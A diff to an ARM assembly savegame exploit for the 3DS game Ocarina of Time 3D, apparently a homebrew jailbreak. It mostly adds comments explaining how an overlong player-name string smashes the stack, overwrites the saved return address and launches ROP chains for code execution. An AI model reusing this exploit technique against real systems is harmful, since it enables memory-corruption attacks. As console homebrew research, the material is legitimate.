@@ -2,6 +2,8 @@
 .section .init
 .global _start
 
+//Note that all code addresses in the form of L_<addr> referenced here are for the USA game.
+
 #if REGION!=0//Non-JPN
 #define svcControlMemory 0x301a0c
 #define svcConnectToPort 0x2fa7b8
@@ -151,12 +153,13 @@
 #endif
 #endif
 
-#define PSPS_SIGBUFSIZE 0x7440//FW0B=0xD9B8.
+#define PSPS_SIGBUFSIZE 0x7440//This is for FW1F. FW0B=0xD9B8.
 
 #define START_ROPTHREAD
 #define THREADSTART_ROPCHAINOFF 0x13dc
 
 #if EXECHAX==3
+//These addresses are for FW1F.
 #define HEAPHAX_HEAPCTX 0x80a2e80
 #define HEAPHAX_HEAPBUF HEAPHAX_HEAPCTX-0x2800//Addr of the ARM9 heap buffer where the input data for amnet cmd 0x08190108 is copied to.
 #define DIFF_FILEREAD_FUNCPTR 0x080952c0+8//This is the addr of the funcptr used by the DIFF verification code for reading data, via a class vtable.
@@ -236,7 +239,7 @@
 _start:
 .word 0xbb, 0x01, 0x8000, 0xe0ba, 0x1, 0x57, 0x57
 .hword 0x48, 0x61, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78 @ UTF-16 "Haxxxxxx"
-.byte 0x9a + 0x14 @ Length of player-name in wchars, so byte-size is u8 value<<1.
+.byte 0x9a + 0x14 @ Length of player-name in utf16-chars, so byte-size is u8 value<<1. The player-name string is copied to the output buffer using lenval<<1, without checking the size or for NUL-termination. With the length used here, this results in a stack-smash once in-game function(s) load this string(see README).
 .byte 0x01, 0x02, 0x00
 .ascii "ZELDAZ"
 .hword 0x428
@@ -267,7 +270,7 @@ _start:
 .word 0x7fff, 0xc0, 0xfa6f, 0xf3f7e3ff
 .word 0x253060
 
-.word REGPOPADR
+.word REGPOPADR @ This is the word which overwrites the saved LR with the stack-smash, thus this is the start of the ROP-chain. This is located at offset 0x14c in the savefile, relative to the playername string it's +0x130.
 .word 0 @ r0: Doesn't matter here, since the code jumped to immediately does "mov r0, sp".
 #ifndef START_ROPTHREAD
 .word SAVEADR+0x180 @ r1: Buffer which will be copied to stack.
@@ -279,7 +282,7 @@ _start:
 .word 0 @ r3
 .word SAVEADR @ r4
 .word 0, 0, 0, 0
-.word STACKMEMCPYADR @ After copying the data to stack, this func calls L_3508b8, see below.
+.word STACKMEMCPYADR @ After copying the data to stack, this func calls L_3508b8, see the end of this .s.
 
 .space (_start + 0x180) - .
 
@@ -572,7 +575,7 @@ SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 .word HAXWORD
 #endif
 
-#if EXECHAX==1 //This code exec method reads the first 0x400-bytes of the save00.bin to .text. This only works prior to system version 4.0.0-7, with FW1D/4.0.0-7 this causes a kernel panic.
+#if EXECHAX==1 //This code exec method reads save00.bin to .text. This only works prior to system version 4.0.0-7, with FW1D/4.0.0-7 this causes a kernel panic.
 .word REGPOPADR
 .word 0x3071d8 @ r0
 .word 0 @ r1
@@ -744,18 +747,6 @@ gxcpy_dstaddr_ropword:
 .word 0 @ fp
 .word 0 @ ip
 .word BLXR6
-
-/*.word REGPOPADR//This code exec method uses GX command0 to DMA arm11code from the savegame, to .text, via svcStartInterProcessDma(). It's unknown whether the ARM11-kernel ever allowed this at all.
-.word 0x00100000 @ r0, DMA dst addr 0x00100000 0x14313890 0x30dbd4
-.word 0x1f300000 @ r1, DMA src addr SAVEADR+0x300 0x1f300000
-.word 0x46500*2 + 0x10 @ r2, size 0x200
-.word 0 @ r3, unused by GSP module
-.word 0x0f @ r4
-.word 0 @ r5
-.word GXLOWCMD_0 @ r6
-.word 0 @ fp
-.word 0 @ ip
-.word BLXR6*/
 
 .word 0, 0 @ d8 / insp0 = height0, insp4 = width1
 .word 0 @ insp8 = height1
@@ -1027,7 +1018,7 @@ mov sp, r0
 
 sub sp, sp, #32
 
-ldr r0, =0x14313890 @ Clear the main-screen framebuffers for framebuf A. http://3dbrew.org/wiki/GPU_Registers
+ldr r0, =0x14313890 @ Overwrite the main-screen framebuffers for framebuf A. http://3dbrew.org/wiki/GPU_Registers
 ldr r1, =0x46500
 ldr r2, =0x13333337
 
@@ -1510,7 +1501,7 @@ appmemtype_appmemsize_table: @ This is a table for the actual APPLICATION mem-re
 .word 13, 8
 
 #ifdef START_ROPTHREAD
-.space (_start + THREADSTART_ROPCHAINOFF) - .
+.space (_start + THREADSTART_ROPCHAINOFF) - . @ Create a thread for running the main ROP. Thread creation is used here since a stack-pivot isn't possible under oot3d with an *absolute* address for sp. Copying more ROP to <current sp> from here isn't an option either, since the ROP-chains(or at least some of them) would be too large for the stack.
 .word REGPOPADR
 .word SAVEADR+0x104c @ r0, thread handle*
 .word REGPOPADR @ r1, func entrypoint
